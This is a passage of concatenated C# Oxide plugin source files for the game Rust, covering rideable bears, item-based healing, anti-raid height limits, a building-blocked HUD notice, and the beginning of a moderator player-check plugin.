                Bear bearEntity = GameManager.server.CreateEntity("assets/rust.ai/agents/bear/bear.prefab", position) as Bear;
                if (bearEntity == null)
                    return null;

                bearEntity.Spawn();
                bearEntity.OwnerID = player;

                var controller = bearEntity.gameObject.GetOrAddComponent<BearController>();

                return bearEntity;
            }

            public static BearData Get(uint bear)
            {
                BearData data = _data.BearsData.Find(x => x.EntityId == bear);
                if (data == null)
                {
                    data = new BearData();
                    data.EntityId = bear;
                    _data.BearsData.Add(data);
                }

                return data;
            }

            public static ItemContainer ByteToItemContainer(byte[] bItem)
            {
                if (bItem == null)
                    return null;

                ProtoBuf.ItemContainer validItem = ProtoBuf.ItemContainer.Deserialize(bItem);
                ItemContainer itm = Pool.Get<ItemContainer>();
                itm.isServer = true;
                itm.Load(validItem);
                return itm;
            }

            public static byte[] ItemContainerToByte(ItemContainer item)
            {
                var protoItem = item.Save();
                return protoItem.ToProtoBytes();
            }

            public static void SaveContainer(uint bear, ItemContainer container)
            {
                var data = PluginData.Get(bear);
                data.Inventory = ItemContainerToByte(container);
            }

            public static void SaveData()
            {
                if (_data == null) return;
                Interface.Oxide.DataFileSystem.WriteObject(DataPath, _data);
            }

            public static void LoadData()
            {
                try
                {
                    if (Interface.Oxide.DataFileSystem.ExistsDatafile(DataPath))
                    {
                        _data = Interface.Oxide.DataFileSystem.ReadObject<PluginData>(DataPath);
                    }
                    else
                    {
                        _data = new PluginData()
                        {
                            BearsData = new List<BearData>()
                        };
                    }

                    if (_data == null)
                    {
                        _data = new PluginData()
                        {
                            BearsData = new List<BearData>()
                        };
                    }

                    foreach (var bearData in _data.BearsData)
                    {
                        if (bearData.IsItem)
                            continue;

                        var bear = CreateControlledBear(bearData.OwnerId, bearData.LastPosition, bearData.GrowSeconds > 0);
                        bearData.EntityId = bear.net.ID;
                    }
                }
                catch (Exception ex)
                {
                    _plugin.PrintWarning("Ошибка загрузки дата-файла, свяжитесь с разработчиком если не знаете как решить проблему - Mercury#5212 | Date file upload error, contact the developer if you don't know how to solve the problem - Mercury#5212");
                }
            }
        }

        #endregion

        #region Config v0.0.1
        private class PluginConfig
        {
            [JsonProperty("Шанс выпадения медвеженка | Chance of a bear cub falling out")]
            public int YoungDropChance = 20;

            [JsonProperty("Сделать бессмертным медведя (true - да/false - нет) | Make a bear immortal (true - yes/false - no)")]
            public Boolean Immortals = false;

            [JsonProperty("Количество хп медведя | The number of hp of the bear")]
            public int MaxHealthAmount = 1200;
            [JsonProperty("Сколько времени растёт медведь в секундах | How long does a bear grow in seconds")]
            public int GrowSeconds = 100;
            [JsonProperty("Скорость ходьбы | Walking speed")]
            public float WalkSpeed = 5f;
            [JsonProperty("Скорость поводка | Leash speed")]
            public float LeadSpeed = 7.5f;
            [JsonProperty("Скорость бега | Running speed")]
            public float RunSpeed = 7.5f;
            [JsonProperty("Скорость бега с шифтом | Running speed with shift")]
            public float SprintSpeed = 10f;
            [JsonProperty("Скорость поворота | Turning speed")]
            public float RotateSpeed = 150;
            [JsonProperty("Размер шага вверх (Если вы не знаете что это такое, не трогайте данную функцию) | Step size up (If you don't know what it is, don't touch this function)")]
            public float StepHigh = 1f;
            [JsonProperty("Размер шага вниз (Если вы не знаете что это такое, не трогайте данную функцию) | Step size down (If you don't know what it is, don't touch this function)")]
            public float StepDown = 1f;
            [JsonProperty("Размер доски длина (Если вы не знаете что это такое, не трогайте данную функцию) | Board size length (If you don't know what it is, don't touch this function)")]
            public float BoardForward = 1.5f;
            [JsonProperty("Размер доски ширина (Если вы не знаете что это такое, не трогайте данную функцию) | Board size width (If you don't know what it is, don't touch this function)")]
            public float BoardRight = 0.2f;
            [JsonProperty("Максимальная высота на которую может залезть | The maximum height that can climb")]
            public float MaxWallClimbSlope = 50f;
            [JsonProperty("Радиус проверки на обьекты (Если вы не знаете что это такое, не трогайте данную функцию) | The radius of checking for objects (If you don't know what it is, don't touch this function)")]
            public float ObsCheckDis = 0.6f;
            [JsonProperty("Радиус проверки шариков поворота (Если вы не знаете что это такое, не трогайте данную функцию) | The radius of the rotation balls check (If you do not know what it is, do not touch this function)")]
            public float RotSphereDis = 0.35f;
            [JsonProperty("Максимальная глубина | Maximum depth")]
            public float MaxWaterDepth = 150f;
            [JsonProperty("Размер инвентаря | Inventory Size")]
            public int InventorySize = 24;
            [JsonProperty("Наносимый урон идивидуальный | The damage inflicted is individual")]
            public Dictionary<string, float> BearDamage;
            [JsonProperty("Сколько здоровья давать при еде | How much health to give when eating")]
            public float EatHealAmount = 50f;

            [JsonProperty("IQChat : Кастомный префикс в чате | IQ Chat : Custom prefix in the chat")]
            public String CustomPrefix = "[IQBearRide]";
            [JsonProperty("IQChat : Кастомный аватар в чате(Если требуется) | IQChat : Custom avatar in the chat (If required)")]
            public String CustomAvatar = "0";
            [JsonProperty("IQChat : Использовать UI уведомления | IQChat : Use UI notifications")]
            public Boolean UIAlertUse = false;

            [JsonProperty("Настройка предмета Медведь | Setting up the Bear Item")]
            public CustomItem BearItem;
            [JsonProperty("Настройка предмета Медвеженок | Setting up the Bear Cub item")]
            public CustomItem YoungBearItem;

            [JsonProperty("Картинка Следовать | Picture To Follow")]
            public string FollowImage = "https://i.imgur.com/0sGNhqD.png";
            [JsonProperty("Картинка Ехать | Picture to ride")]
            public string RideImage = "https://i.imgur.com/xar8gWn.png";
            [JsonProperty("Картинка Поднять | Picture Raise")]
            public string TakeImage = "https://i.imgur.com/973xdCt.png";
            [JsonProperty("Картинка Инвентарь | Picture Inventory")]
            public string InventoryImage = "https://i.imgur.com/OpjOCgL.png";
            [JsonProperty("Картинка Инструкции (С русским переводом - https://i.imgur.com/D5rIpyM.png) | Picture Instructions")]
            public string InstructionImage = "https://i.imgur.com/32JQy4R.png";
        }

        public struct CustomItem
        {
            public CustomItem(string displayName, string shortName, ulong skinId)
            {
                DisplayName = displayName;
                ShortName = shortName;
                SkinId = skinId;
            }

            public string DisplayName;
            public string ShortName;
            public ulong SkinId;

            public Item ToItem(int amount = 1)
            {
                Item item = ItemManager.CreateByName(ShortName, amount, SkinId);
                if (item != null && string.IsNullOrEmpty(DisplayName) == false)
                    item.name = DisplayName;

                return item;
            }

            public bool CompareTo(Item item)
            {
                return this.SkinId == item?.skin && this.ShortName == item?.info.shortname;
            }
        }

        private static PluginConfig _config;

        protected override void LoadConfig()
        {
            base.LoadConfig();

            try
            {
                _config = Config.ReadObject<PluginConfig>();
                if (_config == null)
                {
                    LoadDefaultConfig();
                }
            }
            catch
            {
                for (var i = 0; i < 3; i++)
                {
                    PrintError("Configuration file is corrupt! Check your config file at https://jsonlint.com/");
                }

                LoadDefaultConfig();
                return;
            }

            ValidateConfig();
            SaveConfig();
        }

        private void ValidateConfig()
        {
            if (Interface.Oxide.CallHook("OnConfigValidate") != null)
            {
                PrintWarning("Using default configuration...");
                _config = GetDefaultConfig();
            }
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(_config);
        }

        protected override void LoadDefaultConfig()
        {
            _config = GetDefaultConfig();
        }

        private PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                BearItem = new CustomItem("Медведь | Bear", "stash.small", 2445048695),
                YoungBearItem = new CustomItem("Медвеженок | Teddy bear", "stash.small", 2445033042),
                BearDamage = new Dictionary<string, float>()
                {
                    ["default"] = 50f,
                    ["player"] = 20f,
                }
            };
        }
        #endregion

        #region Lang

        private static StringBuilder sb = new StringBuilder();
        public string GetLang(string LangKey, string userID = null, params object[] args)
        {
            sb.Clear();
            if (args != null)
            {
                sb.AppendFormat(lang.GetMessage(LangKey, this, userID), args);
                return sb.ToString();
            }
            return lang.GetMessage(LangKey, this, userID);
        }
        private new void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["BEAR_FARM_WOOD"] = "[Bear] Wood",
                ["BEAR_PICK_UP"] = "Only the owner can lift the bear",
                ["BEAR_PICK_UP_FULL_INVENTORY"] = "You need to pick up everything from the bear's inventory before picking it up",
                ["BEAR_GROWING_SECOND"] = "It will grow in <size=20>{0}</size> seconds",
                ["BEAR_GROWING_USE_MENU"] = "Press '<size=20>E</size>' for \ninteraction!",

                ["BEAR_MENU_TITLE"] = "BEAR MANAGEMENT",

            }, this);
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["BEAR_FARM_WOOD"] = "[Мишка] Дерево",
                ["BEAR_PICK_UP"] = "Только владелец может поднять медведя",
                ["BEAR_PICK_UP_FULL_INVENTORY"] = "Нужно забрать всё из инвентаря медведя перед тем как его поднять",
                ["BEAR_GROWING_SECOND"] = "Вырастет через <size=20>{0}</size> секунд",
                ["BEAR_GROWING_USE_MENU"] = "Нажмите '<size=20>E</size>' для \nвзаимодействия!",

                ["BEAR_MENU_TITLE"] = "УПРАВЛЕНИЕ МЕДВЕДЕМ",

            }, this, "ru");
            PrintWarning("Языковой файл загружен успешно | The language file was uploaded successfully");
        }
        #endregion
    }
}

// --- End of file: IQBearRide.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/RecoveryItems.cs ---
// --- Original Local Path: RecoveryItems.cs ---

using Oxide.Core.Libraries.Covalence;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Oxide.Core.Plugins;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("RecoveryItems", "RedMat", "1.0.1", ResourceId = 2091)]
    [Description("If you wear an item it is recovered.")] 
    class RecoveryItems : RustPlugin
    {
        #region Global variables
        // Global variables declared area
        string gstrItemListFileNm = "RecoveryItemsData";
        string gstrItemListInfoFileNm = "RecoveryItemsDataInfo";

        #region Timer
        Timer gobjTimer = null;
        #endregion

        #endregion

        #region Init
        void Init()
        {
            LoadDefaultMessages();

            // permission set
            permission.RegisterPermission("recoveryitems.use", this);
        }
        #endregion

        #region Localization

        void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["NoPermission"] = "No permission",
                ["TimeChange"] = "The HP recovery time has changed.",
                ["ItemAdd"] = "Item Add.",
                ["ItemDel"] = "Item Delete",
                ["StartHeal"] = "Start Heal",
                ["Help"] = "Help : /hpitem command[add, del] itemID Amount"
            }, this);
        }

        #endregion

        #region Runtime plug-ins loaded
        /// <summary>
        /// Runtime plug-ins loaded
        /// </summary>
        void Loaded()
        {
            recoveryItemsData = Interface.Oxide.DataFileSystem.ReadObject<RecoveryItemsData>(gstrItemListFileNm);
            recoveryItemsDataInfo = Interface.Oxide.DataFileSystem.ReadObject<RecoveryItemsDataInfo>(gstrItemListInfoFileNm);

            // Default Value
            if (!recoveryItemsData.glstRecoveryItemsData.Contains(2007564590)) recoveryItemsData.glstRecoveryItemsData.Add(2007564590);
            if (!recoveryItemsDataInfo.glstRecoveryItemsDataInfo.ContainsKey(2007564590)) recoveryItemsDataInfo.glstRecoveryItemsDataInfo.Add(2007564590, 1);

            Interface.Oxide.DataFileSystem.WriteObject(gstrItemListFileNm, recoveryItemsData);
            Interface.Oxide.DataFileSystem.WriteObject(gstrItemListInfoFileNm, recoveryItemsDataInfo);

            fStartTimer();
        }
        #endregion

        #region user function

        #region Timer
        private void fStartTimer()
        {
            Single sglTimer = Single.Parse(Config["HpRecoveryTime"].ToString());

            List<int> lstItemData = recoveryItemsData.glstRecoveryItemsData;
            Dictionary<int, int> dctRecoveryItemsDataInfo = recoveryItemsDataInfo.glstRecoveryItemsDataInfo;

            #region í íì´ë¨¸ ì²ë¦¬
            if (gobjTimer != null) gobjTimer.Destroy();
            gobjTimer = timer.Repeat(sglTimer, 0, () =>
            {
                // Search in all your (login)
                for (int i = 0; i < BasePlayer.activePlayerList.Count; i++)
                {
                    BasePlayer objPlayer = new BasePlayer();

                    objPlayer = BasePlayer.activePlayerList[i];

                    // Apply the amount of recovered items set
                    for (int y = 0; y < lstItemData.Count; y++)
                    {
                        // Check whether the item is set
                        if (dctRecoveryItemsDataInfo.ContainsKey(lstItemData[y]))
                        {
                            if ((bool)fGetWear(objPlayer, lstItemData[y]))
                            {
                                objPlayer.Heal(dctRecoveryItemsDataInfo[lstItemData[y]]);
                            }
                        }
                    }
                }
            });
            #endregion
        }
        #endregion
        
        #region Whether to wear a particular item
        private bool fGetWear(BasePlayer pobjBasePlayer, int pintItemID)
        {
            Item objWearItem = pobjBasePlayer.inventory.containerWear.FindItemByItemID(pintItemID);

            if (objWearItem != null)
            {
                return true;
            }

            return false;
        }
        #endregion

        #region ChatCommand

        [ChatCommand("rt")]
        void fChatCmdHpTime(BasePlayer pbasPlayer, string pstrCmd, string[] args)
        {
            string strParam = "";
            string strConfig = Config["HpRecoveryTime"].ToString();
            Single sglHpTime = 5f;

            // Check permissions
            if (!permission.UserHasPermission(pbasPlayer.UserIDString, "recoveryitems.use"))
            {
                SendReply(pbasPlayer, Lang("NoPermission", pbasPlayer.UserIDString));
                return;
            }

            if (args.Length > 0)
            {
                strParam = args[0];
                Single.TryParse(strParam, out sglHpTime);
            }

            Single.TryParse(strConfig, out sglHpTime);

            if (strConfig == null || sglHpTime < 1)
            {
                Config["HpRecoveryTime"] = 5f;
            }
            else
            {
                Config["HpRecoveryTime"] = sglHpTime;
            }

            SaveConfig();

            SendReply(pbasPlayer, Lang("TimeChange", pbasPlayer.UserIDString));

            fStartTimer();
        }

        [ChatCommand("ri")]
        void fChatCmdHpItem(BasePlayer pbasPlayer, string pstrCmd, string[] args)
        {
            // Check permissions
            if (!permission.UserHasPermission(pbasPlayer.UserIDString, "recoveryitems.use"))
            {
                SendReply(pbasPlayer, Lang("NoPermission", pbasPlayer.UserIDString));
                return;
            }

            if (args.Length > 3)
            {
                SendReply(pbasPlayer, Lang("Help", pbasPlayer.UserIDString));
            }
            else
            {
                switch(args[0])
                {
                    case "add":
                        if (!recoveryItemsData.glstRecoveryItemsData.Contains(int.Parse(args[1])))
                        {
                            recoveryItemsData.glstRecoveryItemsData.Add(int.Parse(args[1]));
                        }

                        if (!recoveryItemsDataInfo.glstRecoveryItemsDataInfo.ContainsKey(int.Parse(args[1])))
                        {
                            recoveryItemsDataInfo.glstRecoveryItemsDataInfo.Add(int.Parse(args[1]), int.Parse(args[2]));
                        }

                        SendReply(pbasPlayer, Lang("ItemAdd", pbasPlayer.UserIDString));
                        break;
                    case "del":
                        if (recoveryItemsData.glstRecoveryItemsData.Contains(int.Parse(args[1])))
                        {
                            recoveryItemsData.glstRecoveryItemsData.Remove(int.Parse(args[1]));
                        }

                        if (recoveryItemsDataInfo.glstRecoveryItemsDataInfo.ContainsKey(int.Parse(args[1])))
                        {
                           recoveryItemsDataInfo.glstRecoveryItemsDataInfo.Remove(int.Parse(args[1]));
                        }

                        SendReply(pbasPlayer, Lang("ItemDel", pbasPlayer.UserIDString));
                        break;
                    default:
                        SendReply(pbasPlayer, Lang("Help", pbasPlayer.UserIDString));
                        break;
                }

                Interface.Oxide.DataFileSystem.WriteObject(gstrItemListFileNm, recoveryItemsData);
                Interface.Oxide.DataFileSystem.WriteObject(gstrItemListInfoFileNm, recoveryItemsDataInfo);

                fStartTimer();
                SendReply(pbasPlayer, Lang("StartHeal", pbasPlayer.UserIDString));
            }
        }

        #endregion

        #region Config File Create
        protected override void LoadDefaultConfig()
        {
            PrintWarning("Creating a new configuration file");
            Config.Clear();
            Config["HpRecoveryTime"] = 5;
            SaveConfig();
        }
        #endregion

        #region DataFile Create
        RecoveryItemsData recoveryItemsData;
        RecoveryItemsDataInfo recoveryItemsDataInfo;

        class RecoveryItemsData
        {
            public List<int> glstRecoveryItemsData = new List<int>();

            public RecoveryItemsData()
            {
            }
        }

        class RecoveryItemsDataInfo
        {
            public Dictionary<int, int> glstRecoveryItemsDataInfo = new Dictionary<int, int>();

            public RecoveryItemsDataInfo()
            {
            }
        }
        #endregion

        string Lang(string key, string id = null, params object[] args) => string.Format(lang.GetMessage(key, this, id), args);

        #endregion
    }
}


// --- End of file: RecoveryItems.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/AntiRaidTower.cs ---
// --- Original Local Path: AntiRaidTower.cs ---

using System;
using System.Collections.Generic;
using Oxide.Core.Plugins;
using Rust;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("AntiRaidTower", "Calytic @ RustServers.IO", "0.2.2", ResourceId = 1211)]
    [Description("Building/deployable height limit, high jump instant death, no wounded teleport")]
    class AntiRaidTower : RustPlugin
    {
        int FallKill;
        bool BuildingBlockHeight;
        bool DeployableBlockHeight;
        int BuildingMaxHeight;
        int DeployableMaxHeight;

        void OnServerInitialized()
        {
            permission.RegisterPermission("antiraidtower.blockheightbypass", this);
            permission.RegisterPermission("antiraidtower.deployheightbypass", this);
            permission.RegisterPermission("antiraidtower.fallkillbypass", this);
            permission.RegisterPermission("antiraidtower.woundedbypass", this);
            LoadMessages();
            LoadData();

            FallKill = GetConfig("FallKill", 215);
            BuildingBlockHeight = GetConfig("BuildingBlockHeight", true);
            DeployableBlockHeight = GetConfig("DeployableBlockHeight", true);
            BuildingMaxHeight = GetConfig("BuildingMaxHeight", 50);
            DeployableMaxHeight = GetConfig("DeployableMaxHeight", 50);
        }

        protected override void LoadDefaultConfig()
        {
            Config["FallKill"] = 215;
            Config["BuildingBlockHeight"] = true;
            Config["BuildingMaxHeight"] = 50;
            Config["DeployableBlockHeight"] = true;
            Config["DeployableMaxHeight"] = 50;

            Config["VERSION"] = Version.ToString();
        }

        void LoadMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"Denied: Height", "Too far from ground: {0}m"},
                {"Denied: Wounded", "You may not teleport while wounded"},
            }, this);
        }

        void LoadData()
        {
            if (Config["VERSION"] == null)
            {
                // FOR COMPATIBILITY WITH INITIAL VERSIONS WITHOUT VERSIONED CONFIG
                ReloadConfig();
            }
            else if (GetConfig<string>("VERSION", Version.ToString()) != Version.ToString())
            {
                // ADDS NEW, IF ANY, CONFIGURATION OPTIONS
                ReloadConfig();
            }
        }

        protected void ReloadConfig()
        {
            Config["VERSION"] = Version.ToString();

            // NEW CONFIGURATION OPTIONS HERE
            Config["BuildingBlockHeight"] = true;
            Config["BuildingMaxHeight"] = 50;
            Config["DeployableBlockHeight"] = true;
            Config["DeployableMaxHeight"] = 50;
            // END NEW CONFIGURATION OPTIONS

            PrintToConsole("Upgrading configuration file");
            SaveConfig();
        }

        private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitinfo)
        {
            if (FallKill == 0)
            {
                return;
            }

            if (entity is BasePlayer)
            {
                var player = (BasePlayer)entity;
                if (permission.UserHasPermission(player.UserIDString, "antiraidtower.fallkillbypass"))
                {
                    return;
                }
                if (player.IsConnected() && player.net.connection.authLevel > 0)
                {
                    return;
                }
                var dt = hitinfo.damageTypes.GetMajorityDamageType();
                float amt = hitinfo.damageTypes.Get(dt);
                if (dt == DamageType.Fall)
                {
                    float fallkill = Convert.ToSingle(FallKill);
                    if (amt > fallkill)
                    {
                        player.Die();
                    }
                }
            }
        }

        object CanTeleport(BasePlayer player)
        {
            if (permission.UserHasPermission(player.UserIDString, "antiraidtower.woundedbypass"))
            {
                return null;
            }
            if (player.IsWounded()) { return GetMsg("Denied: Wounded", player.UserIDString); }
            return null;
        }

        object canTeleport(BasePlayer player)
        {
            return CanTeleport(player);
        }

        void OnEntityBuilt(Planner planner, GameObject gameObject)
        {
            var player = planner.GetOwnerPlayer();
            if (player == null) return;
            if (!BuildingBlockHeight && !DeployableBlockHeight) return;

            var MaxHeight = 0;
            var entity = gameObject.GetComponent<BaseCombatEntity>();
            if(entity is BuildingBlock) {
                if (permission.UserHasPermission(player.UserIDString, "antiraidtower.blockheightbypass"))
                {
                    return;
                }
                MaxHeight = BuildingMaxHeight;
            }
            else
            {
                if (permission.UserHasPermission(player.UserIDString, "antiraidtower.deployheightbypass"))
                {
                    return;
                }
                MaxHeight = DeployableMaxHeight;
            }

            RaycastHit hitInfo;
            if (entity != null && Physics.Raycast(new Ray(entity.transform.position, Vector3.down), out hitInfo, float.PositiveInfinity, Rust.Layers.Terrain))
            {
                if (hitInfo.distance > MaxHeight)
                {
                    SendReply(player, GetMsg("Denied: Height", player.UserIDString), Math.Round(hitInfo.distance, 0));
                    entity.Kill(BaseNetworkable.DestroyMode.Gib);
                }
            }
        }

        private T GetConfig<T>(string name, T defaultValue)
        {
            if (Config[name] == null)
            {
                return defaultValue;
            }

            return (T)Convert.ChangeType(Config[name], typeof(T));
        }

        string GetMsg(string key, string userID = null)
        {
            return lang.GetMessage(key, this, userID);
        }
    }
}

// --- End of file: AntiRaidTower.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/BuildingBlockGUI.cs ---
// --- Original Local Path: BuildingBlockGUI.cs ---

using System;
using System.Linq;
using System.Collections.Generic;
using UnityEngine;
using Oxide.Game.Rust.Cui;

namespace Oxide.Plugins
{
    [Info("BuildingBlockGUI", "wazzzup", "1.1.0")]
    [Description("Displays GUI to player when he enters or leaves building block without need of Planner")]
    public class BuildingBlockGUI : RustPlugin
    {

        #region Config
        List<ulong> activeUI = new List<ulong>();
        private bool configChanged = false;
        private float configTimerSeconds;
        private bool configUseTimer;
        private bool configUseImage;
        private string configImageURL;
        private bool configUseGameTips;
        private string configAnchorMin;
        private string configAnchorMax;
        private string configUIColor;
        private string configUITextColor;

        Timer _timer;

        protected override void LoadDefaultConfig()
        {
            PrintWarning("No configuration file found, generating...");
            Config.Clear();
            LoadVariables();
        }

        void LoadVariables()
        {
            configUseTimer = Convert.ToBoolean(GetConfig("useTimer", true));
            configUseImage = Convert.ToBoolean(GetConfig("useImage", false));
            configImageURL = Convert.ToString(GetConfig("ImageURL", "http://oxidemod.org/data/resource_icons/2/2713.jpg?1512759786"));
            configUseGameTips = Convert.ToBoolean(GetConfig("UseGameTips", false));
            configTimerSeconds = Convert.ToSingle(GetConfig("timerSeconds", 0.5f));
            configAnchorMin = Convert.ToString(GetConfig("AnchorMin", "0.35 0.11"));
            configAnchorMax = Convert.ToString(GetConfig("AnchorMax", "0.63 0.14"));
            configUIColor = Convert.ToString(GetConfig("UIColor", "1 0 0 0.15"));
            configUITextColor = Convert.ToString(GetConfig("UITextColor", "1 1 1"));
            if (configChanged)
            {
                SaveConfig();
                configChanged = false;
            }
        }

        private object GetConfig(string dataValue, object defaultValue)
        {
            object value = Config[dataValue];
            if (value == null)
            {
                value = defaultValue;
                Config[dataValue] = value;
                configChanged = true;
            }
            return value;
        }

        #endregion

        #region Messages
        void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>()
            {
                {"text", "BUILDING BLOCKED" }

            }, this);
            lang.RegisterMessages(new Dictionary<string, string>()
            {
                {"text", "СТРОИТЕЛЬСТВО ЗАПРЕЩЕНО" }
            }, this, "ru");
        }
        private string msg(string key, BasePlayer player = null) => lang.GetMessage(key, this, player?.UserIDString);
        #endregion

        #region Oxide hooks

        void Init()
        {
            LoadVariables();
        }

        void OnServerInitialized()
        {
            if (configUseTimer)
            {
                _timer = timer.Repeat(configTimerSeconds, 0, () => PluginTimerTick());
            }
        }

        void Unload()
        {
            if (_timer != null) _timer.Destroy();
            foreach (var player in BasePlayer.activePlayerList)
            {
                DestroyUI(player);
            }
        }

        void OnPlayerDisconnected(BasePlayer player)
        {
            DestroyUI(player);
        }

        #endregion

        #region UI

        void DestroyUI(BasePlayer player)
        {
            if (!activeUI.Contains(player.userID)) return;
            if (configUseGameTips) player.SendConsoleCommand("gametip.hidegametip");
            else CuiHelper.DestroyUi(player, "BuildingBlockGUI");
            activeUI.Remove(player.userID);
        }

        void CreateUI(BasePlayer player)
        {
            if (activeUI.Contains(player.userID)) return;
            if (configUseGameTips)
            {
                player.SendConsoleCommand("gametip.hidegametip");
                player.SendConsoleCommand("gametip.showgametip", msg("text", player));
                activeUI.Add(player.userID);
                return;
            }
            DestroyUI(player);
            CuiElementContainer container = new CuiElementContainer();
            if (configUseImage)
            {
                var panel = container.Add(new CuiPanel()
                {
                    Image = { Color = configUIColor },
                    RectTransform = { AnchorMin = configAnchorMin, AnchorMax = configAnchorMax }
                }, "Hud", "BuildingBlockGUI");
                container.Add(new CuiElement()
                {
                    Name = CuiHelper.GetGuid(),
                    Parent = panel,
                    Components =
                    {
                        new CuiRawImageComponent {
                            Url = configImageURL,
                            Sprite = "assets/content/textures/generic/fulltransparent.tga" },
                        new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1" }
                    }
                });
            }
            else
            {
                var panel = container.Add(new CuiPanel()
                {
                    Image = { Color = configUIColor },
                    RectTransform = { AnchorMin = configAnchorMin, AnchorMax = configAnchorMax }
                }, "Hud", "BuildingBlockGUI");
                CuiElement element = new CuiElement
                {
                    Parent = panel,
                    Components = {
                        new CuiTextComponent { Text = msg("text",player), FontSize = 15, Color = configUITextColor, Align = TextAnchor.MiddleCenter },
                        new CuiRectTransformComponent { AnchorMin = "0.0 0.0", AnchorMax = "1.0 1.0" }
                    }
                };
                container.Add(element);
            }

            CuiHelper.AddUi(player, container);
            activeUI.Add(player.userID);
        }
        #endregion

        #region Helpers
        void PluginTimerTick()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                if (player.IsBuildingBlocked())
                {
                    CreateUI(player);
                } else
                {
                    DestroyUI(player);
                }
            }
        }

        #endregion
    }
}

// --- End of file: BuildingBlockGUI.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/CheckPlayers.cs ---
// --- Original Local Path: CheckPlayers.cs ---

using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("CheckPlayers", "SkiTles", "0.2")]
    class CheckPlayers : RustPlugin
    {
        //Данный плагин принадлежит группе vk.com/vkbotrust
        //Данный плагин предоставляется в существующей форме,
        //"как есть", без каких бы то ни было явных или
        //подразумеваемых гарантий, разработчик не несет
        //ответственность в случае его неправильного использования.

        #region Vars
        [PluginReference]
        Plugin VKBot;
        private Dictionary<BasePlayer, BasePlayer> PlayersCheckList = new Dictionary<BasePlayer, BasePlayer>(); //moder, target
        private BasePlayer CheckCMDPlayer = null;
        #endregion

        #region Config
        private ConfigData config;
        private class ConfigData
        {
            [JsonProperty(PropertyName = "Основные настройки")]
            public MainSettings mainSet { get; set; }
            public class MainSettings
            {
                [JsonProperty(PropertyName = "Привилегия для команд вызова на проверку/завершения проверки")]
                [DefaultValue("vkbot.checkplayers")]
                public string PlCheckPerm { get; set; } = "checkplayers.use";
                [JsonProperty(PropertyName = "Текст уведомления")]
                [DefaultValue("<color=#990404>Модератор вызвал вас на проверку.</color> \nНапишите свой скайп с помощью команды <color=#990404>/skype <НИК в СКАЙПЕ>.</color>\nЕсли вы покините сервер, Вы будете забанены на нашем проекте серверов.")]
                public string PlCheckText { get; set; } = "<color=#990404>Модератор вызвал вас на проверку.</color> \nНапишите свой скайп с помощью команды <color=#990404>/skype <НИК в СКАЙПЕ>.</color>\nЕсли вы покините сервер, Вы будете забанены на нашем проекте серверов.";
                [JsonProperty(PropertyName = "Бан игрока при выходе с сервера во время проверки")]
                [DefaultValue(false)]
                public bool AutoBan { get; set; } = false;
                [JsonProperty(PropertyName = "Кастомная команда для автобана (оставить none если не нужно). Пример: banid {steamid} {reason} 4d")]
                [DefaultValue("none")]
                public string BanCmd { get; set; } = "none";
                [JsonProperty(PropertyName = "Позиция GUI AnchorMin (дефолт 0 0.826)")]
                [DefaultValue("0 0.826")]
                public string GUIAnchorMin { get; set; } = "0 0.826";
                [JsonProperty(PropertyName = "Позиция GUI AnchorMax (дефолт 1 0.965)")]
                [DefaultValue("1 0.965")]
                public string GUIAnchorMax { get; set; } = "1 0.965";
                [JsonProperty(PropertyName = "Команда вызова игрока на проверку")]
                [DefaultValue("alert")]
                public string CMDalert { get; set; } = "alert";
                [JsonProperty(PropertyName = "Команда завершения проверки игрока")]
                [DefaultValue("unalert")]
                public string CMDunalert { get; set; } = "unalert";
                [JsonProperty(PropertyName = "Команда отправки скайпа модератору")]
                [DefaultValue("skype")]
                public string CMDskype { get; set; } = "skype";
                [JsonProperty(PropertyName = "Отправка скайпа админу в ВК (при вызове на проверку консольной командой)")]
                [DefaultValue(false)]
                public bool admMsg { get; set; } = false;
                [JsonProperty(PropertyName = "Отправка скайпа в беседу ВК (при вызове на проверку консольной командой)")]
                [DefaultValue(false)]
                public bool admChat { get; set; } = false;
            }
        }
        private void LoadVariables()
        {
            bool changed = false;
            Config.Settings.DefaultValueHandling = DefaultValueHandling.Populate;
            config = Config.ReadObject<ConfigData>();
            if (config.mainSet == null) { config.mainSet = new ConfigData.MainSettings(); changed = true; }
            Config.WriteObject(config, true);
            if (changed) PrintWarning("Конфигурационный файл обновлен.");
        }
        protected override void LoadDefaultConfig()
        {
            var configData = new ConfigData { mainSet = new ConfigData.MainSettings() };
            Config.WriteObject(configData, true);
            PrintWarning("Поддержи разработчика! Вступи в группу vk.com/vkbotrust");
        }
        #endregion

        #region OxideHooks
        void OnServerInitialized()
        {
            LoadVariables();
            if (!permission.PermissionExists(config.mainSet.PlCheckPerm)) permission.RegisterPermission(config.mainSet.PlCheckPerm, this);
            cmd.AddChatCommand(config.mainSet.CMDalert, this, "CheckPlayerChat");
            cmd.AddChatCommand(config.mainSet.CMDunalert, this, "UnCheckPlayerChat");
            cmd.AddChatCommand(config.mainSet.CMDskype, this, "SendSkype");
            cmd.AddConsoleCommand(config.mainSet.CMDalert, this, "CheckPlayerCMD");
            cmd.AddConsoleCommand(config.mainSet.CMDunalert, this, "StopCheckPlayerCMD");
        }
        void Loaded() => LoadMessages();
        void Unload() => UnloadAllGUI();
